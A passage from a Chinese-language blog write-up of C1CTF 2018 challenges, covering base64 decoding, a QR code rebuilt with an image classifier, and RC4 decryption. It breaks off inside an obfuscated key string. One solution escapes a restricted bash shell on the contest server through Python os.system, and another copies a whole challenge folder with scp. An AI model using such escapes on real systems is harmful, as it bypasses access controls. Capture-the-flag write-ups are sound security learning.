<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>C1CTF 2018 Writeup - rmb122's notebook</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Misc
0x01 签到
base64 解码一下就行, 不懂的同学可以看一下这个
1$ base64 -d                                     
2QzFDVEZ7dzNsZWMwbWVfdE9fQzFDVEZ9
3C1CTF{w3lec0me_tO_C1CTF}
"><meta property="og:image" content><meta property="og:title" content="C1CTF 2018 Writeup"><meta property="og:description" content="Misc
0x01 签到
base64 解码一下就行, 不懂的同学可以看一下这个
1$ base64 -d                                     
2QzFDVEZ7dzNsZWMwbWVfdE9fQzFDVEZ9
3C1CTF{w3lec0me_tO_C1CTF}
"><meta property="og:type" content="article"><meta property="og:url" content="https://rmb122.com/2018/12/12/c1ctf-2018-writeup/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2018-12-12T21:57:13+00:00"><meta property="article:modified_time" content="2018-12-12T21:57:13+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="C1CTF 2018 Writeup"><meta name=twitter:description content="Misc
0x01 签到
base64 解码一下就行, 不懂的同学可以看一下这个
1$ base64 -d                                     
2QzFDVEZ7dzNsZWMwbWVfdE9fQzFDVEZ9
3C1CTF{w3lec0me_tO_C1CTF}
"><script src=https://rmb122.com/js/feather.min.js></script>
<link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.e9aac7e7a771269044e258ce034f7420b431b95683d4aef0faa4d381efbb16d3.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.4d342f24ad49bb75f14c3b92c9454fe693d293fb7474ecc40a101a8ad6af9d71.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>首页</a>&nbsp;
<a href=/posts>归档</a>&nbsp;
<a href=/tags>标签</a>&nbsp;
<a href=/links>友链</a>&nbsp;
<a href=/about>关于</a>
| <a id=dark-mode-toggle onclick=toggleTheme() href></a>
<script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>C1CTF 2018 Writeup</h1><div class=meta>发表于 2018 年 12 月 12 日</div></div><section class=body><h2 id=misc>Misc</h2><h3 id=0x01-签到>0x01 签到</h3><p>base64 解码一下就行, 不懂的同学可以看一下<a href=https://www.rmb122.cn/index.php/2018/04/26/base64-%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/ title rel="noopener nofollow noreferrer" target=_blank>这个</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>$ base64 -d                                     
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>QzFDVEZ7dzNsZWMwbWVfdE9fQzFDVEZ9
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>C1CTF{w3lec0me_tO_C1CTF}
</span></span></code></pre></div><h3 id=0x02find-the-flag>0x02 find the flag~</h3><p>这道题我应该是非预期了 233 我用的是</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>$ scp -P <span style=color:#bd93f9>8999</span> -r ssh_bash@212.64.85.131:/home/ssh_bash/ .
</span></span></code></pre></div><p>直接把整个文件夹给下下来了, 正确做法应该是尝试几个常用命令可以发现有 python, 然后直接用 os.system 就 OK 了</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff79c6>&gt;&gt;&gt;</span> <span style=color:#ff79c6>import</span> os
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#ff79c6>&gt;&gt;&gt;</span> os<span style=color:#ff79c6>.</span>system(<span style=color:#f1fa8c>&#39;/bin/ls /home/ssh_bash/&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#8be9fd;font-style:italic>bin</span>  c5836008c1649301e29351a55db8f65c
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span><span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span><span style=color:#ff79c6>&gt;&gt;&gt;</span> os<span style=color:#ff79c6>.</span>system(<span style=color:#f1fa8c>&#39;/bin/cat c5836008c1649301e29351a55db8f65c&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>C1CTF{Bash_l1mit3d}
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span><span style=color:#bd93f9>0</span>
</span></span></code></pre></div><h3 id=0x03cats-and-dogs>0x03 cats and dogs</h3><p>脑洞一下可以想到出题人把二维码中的黑的像素换成狗的图片, 把白的像素换成喵咪的图片. binwalk 出来的 mysql 文件应该是意外&mldr;</p><p>图片大小 17400x17400, 可以靠神经网络来识别内容, 当然你也可以靠人工来识别, 如果你有足够耐心的话&mldr; </p><p>先靠 PIL 把图像给切割了, 如果因为图像太大, 遇到 DecompressionBombError, 可以把 PIL 源码改成 pass 就可以了, 报错是不可能报错的, 这辈子都不可能报错的</p><p><img src=https://i.loli.net/2019/03/08/5c826d05ce0aa.png#center alt referrerpolicy=no-referrer></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>from</span> PIL <span style=color:#ff79c6>import</span> Image
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>img <span style=color:#ff79c6>=</span> Image<span style=color:#ff79c6>.</span>open(<span style=color:#f1fa8c>&#39;cat&amp;dog.jpg&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#6272a4>#region = (0, 0, 200, 200)</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#6272a4># (x0,y0,x1,y1)</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>num <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#ff79c6>for</span> y <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>87</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>    <span style=color:#ff79c6>for</span> x <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>87</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>        tmp <span style=color:#ff79c6>=</span> (<span style=color:#bd93f9>0</span> <span style=color:#ff79c6>+</span> x <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>200</span>, <span style=color:#bd93f9>0</span> <span style=color:#ff79c6>+</span> y <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>200</span>, <span style=color:#bd93f9>200</span> <span style=color:#ff79c6>+</span> x <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>200</span>, <span style=color:#bd93f9>200</span> <span style=color:#ff79c6>+</span> y <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>200</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>        part <span style=color:#ff79c6>=</span> img<span style=color:#ff79c6>.</span>crop(tmp)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        part<span style=color:#ff79c6>.</span>save(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#39;pics/</span><span style=color:#f1fa8c>{</span>num<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>.png&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>        num <span style=color:#ff79c6>+=</span> <span style=color:#bd93f9>1</span>
</span></span></code></pre></div><p>切割完成后考虑的就是识别的问题了. HINT 给了数据集, 可以在 Github 上找现成的, 中间试了好几个模型, 最后找到<a href=https://github.com/mrgloom/kaggle-dogs-vs-cats-solution title rel="noopener nofollow noreferrer" target=_blank>这个</a>, 是 google 之类拿来发论文的模型, 准确率不知道比个人训练的好到哪里去了. 我自己用的 linux, 装起环境来还挺方便, 这里一键装个 Caffe 就行了. 然后改一下示例代码. 用了 SqeezeNet_v1.1 的模型, 然后开跑就 ok</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>import</span> os
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff79c6>import</span> sys
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#ff79c6>import</span> shutil
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#ff79c6>import</span> numpy <span style=color:#ff79c6>as</span> np
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#ff79c6>import</span> usefull_utils
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#6272a4>#Iterate over all data and get prediction errors</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>os<span style=color:#ff79c6>.</span>environ[<span style=color:#f1fa8c>&#39;GLOG_minloglevel&#39;</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;2&#39;</span> 
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#ff79c6>import</span> caffe
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>&#39;&#39;&#39;if len(sys.argv) != 6:
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>    print &#34;Usage: python get_predition_errors.py deploy.prototxt model.caffemodel mean.npy &lt;cat_data_folder&gt; &lt;dog_data_folder&gt;&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>    sys.exit()&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>    
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>DEPLOY_PROTOTXT <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;kaggle-dogs-vs-cats-solution/demo/SqeezeNet_v1.1/deploy.prototxt&#39;</span> <span style=color:#6272a4>#deploy.prototxt</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>CAFFE_MODEL <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;kaggle-dogs-vs-cats-solution/demo/SqeezeNet_v1.1/model.caffemodel&#39;</span><span style=color:#6272a4>#model.caffemodel</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>MEAN_FILE <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;kaggle-dogs-vs-cats-solution/demo/SqeezeNet_v1.1/mean.npy&#39;</span> <span style=color:#6272a4>#mean.npy</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>MODEL_POSTFIX<span style=color:#ff79c6>=</span> CAFFE_MODEL<span style=color:#ff79c6>.</span>split(os<span style=color:#ff79c6>.</span>sep)[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>2</span>] <span style=color:#6272a4># not safe way</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>&#39;&#39;&#39;CAT_DATA_FOLDER= sys.argv[4]
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>DOG_DATA_FOLDER= sys.argv[5]&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;MODEL_POSTFIX&#34;</span>, MODEL_POSTFIX)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#6272a4>#caffe.set_mode_gpu()</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>net <span style=color:#ff79c6>=</span> caffe<span style=color:#ff79c6>.</span>Classifier(DEPLOY_PROTOTXT, CAFFE_MODEL,
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>                       mean<span style=color:#ff79c6>=</span>np<span style=color:#ff79c6>.</span>load(MEAN_FILE)<span style=color:#ff79c6>.</span>mean(<span style=color:#bd93f9>1</span>)<span style=color:#ff79c6>.</span>mean(<span style=color:#bd93f9>1</span>),
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>                       channel_swap<span style=color:#ff79c6>=</span>(<span style=color:#bd93f9>2</span>,<span style=color:#bd93f9>1</span>,<span style=color:#bd93f9>0</span>),
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>                       raw_scale<span style=color:#ff79c6>=</span><span style=color:#bd93f9>255</span>,
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>                       image_dims<span style=color:#ff79c6>=</span>(<span style=color:#bd93f9>256</span>, <span style=color:#bd93f9>256</span>))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#ff79c6>from</span> PIL <span style=color:#ff79c6>import</span> Image
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>img <span style=color:#ff79c6>=</span> Image<span style=color:#ff79c6>.</span>new(<span style=color:#f1fa8c>&#34;L&#34;</span>, (<span style=color:#bd93f9>87</span>, <span style=color:#bd93f9>87</span>), <span style=color:#bd93f9>255</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>col <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>row <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span><span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>7569</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>    prediction <span style=color:#ff79c6>=</span> net<span style=color:#ff79c6>.</span>predict([caffe<span style=color:#ff79c6>.</span>io<span style=color:#ff79c6>.</span>load_image(<span style=color:#f1fa8c>&#39;pics/&#39;</span> <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>str</span>(i) <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39;.png&#39;</span>)])
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>    <span style=color:#8be9fd;font-style:italic>print</span>(i, prediction[<span style=color:#bd93f9>0</span>]<span style=color:#ff79c6>.</span>argmax())
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>    <span style=color:#ff79c6>if</span> (prediction[<span style=color:#bd93f9>0</span>]<span style=color:#ff79c6>.</span>argmax() <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>1</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span>        img<span style=color:#ff79c6>.</span>putpixel((col, row), <span style=color:#bd93f9>0</span>)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>    col <span style=color:#ff79c6>+=</span> <span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span>    <span style=color:#ff79c6>if</span> col <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>87</span>:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span>        img<span style=color:#ff79c6>.</span>show()
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span>        row <span style=color:#ff79c6>+=</span> <span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span>        col <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span>img<span style=color:#ff79c6>.</span>save(<span style=color:#f1fa8c>&#39;out.png&#39;</span>)
</span></span></code></pre></div><p><img src=https://i.loli.net/2019/03/08/5c826d603e3ac.png#center alt referrerpolicy=no-referrer></p><p>然后你就可以得到这个~</p><p>扫一下得到 C1CTF{Do_u_lik3_An1mals?}</p><h3 id=0x04easy_crypto>0x04 easy_crypto</h3><p>1 和 2 比较相似, 就一起说了, 两题都是 RC4, 因为是对称加密, 所以对于第一题 easy_crypto1 只要翻译过来就行了, 我就在网上找了个现成的</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>crypt</span>(data, key):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#f1fa8c>&#34;&#34;&#34;RC4 algorithm&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    x <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    box <span style=color:#ff79c6>=</span> [i <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>256</span>)]
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>256</span>):
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>        x <span style=color:#ff79c6>=</span> (x <span style=color:#ff79c6>+</span> box[i] <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>ord</span>(key[i <span style=color:#ff79c6>%</span> <span style=color:#8be9fd;font-style:italic>len</span>(key)])) <span style=color:#ff79c6>%</span> <span style=color:#bd93f9>256</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>        box[i], box[x] <span style=color:#ff79c6>=</span> box[x], box[i]
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>    x <span style=color:#ff79c6>=</span> y <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>    out <span style=color:#ff79c6>=</span> []
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    <span style=color:#ff79c6>for</span> char <span style=color:#ff79c6>in</span> data:
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        x <span style=color:#ff79c6>=</span> (x <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>1</span>) <span style=color:#ff79c6>%</span> <span style=color:#bd93f9>256</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>        y <span style=color:#ff79c6>=</span> (y <span style=color:#ff79c6>+</span> box[x]) <span style=color:#ff79c6>%</span> <span style=color:#bd93f9>256</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>        box[x], box[y] <span style=color:#ff79c6>=</span> box[y], box[x]
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>        out<span style=color:#ff79c6>.</span>append(<span style=color:#8be9fd;font-style:italic>chr</span>(char <span style=color:#ff79c6>^</span> box[(box[x] <span style=color:#ff79c6>+</span> box[y]<span style=color:#ff79c6>%</span><span style=color:#bd93f9>256</span>) <span style=color:#ff79c6>%</span> <span style=color:#bd93f9>256</span>]))
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>    <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#39;&#39;</span><span style=color:#ff79c6>.</span>join(out)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>data <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#39;easy_enc.txt&#39;</span>, <span style=color:#f1fa8c>&#39;rb&#39;</span>)<span style=color:#ff79c6>.</span>read()
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>key <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;hello world&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>data <span style=color:#ff79c6>=</span> data<span style=color:#ff79c6>.</span>replace(<span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\r</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>encode(), <span style=color:#f1fa8c>&#34;&#34;</span><span style=color:#ff79c6>.</span>encode())
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>data <span style=color:#ff79c6>=</span> crypt(data, key)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#8be9fd;font-style:italic>print</span>(data)
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#6272a4># C1ctf{5ca4a10ca6de1639674a822cc93c81fb}</span>
</span></span></code></pre></div><p>注意 data.replace("\r".encode(), &ldquo;".encode()), 出题人用的 windows 保存的时候忘了用 wb 模式了, 所以把 CRLF 给一起保存进去了, 所以 \r 会乱码, 把 \r 替换掉就 ok</p><p>第二题, 出题人把 key 加密了一下, 我们取一段来看看 <code>_____*((__//__+___+______-____%____)**</code> 可以猜出来 _ 的数量对应数字, 这整个 key 其实是个表达式. 写个脚本解密一下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>import</span> base64
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>key <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;_____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)\*__+_)\*\*_________+_______*(((_________%_______)\*__+_______-(________//________))\*\*_______)+(________/__)*(((____-_+_______)*(______+____))\*\*___)+___\*((__+_________-_)\*\*_____)+___\*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))\*\*__)+(_//_)\*(((________%___%__+_____+_____)%______)+_______-_)\*\*___+_____\*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___&#34;</span>
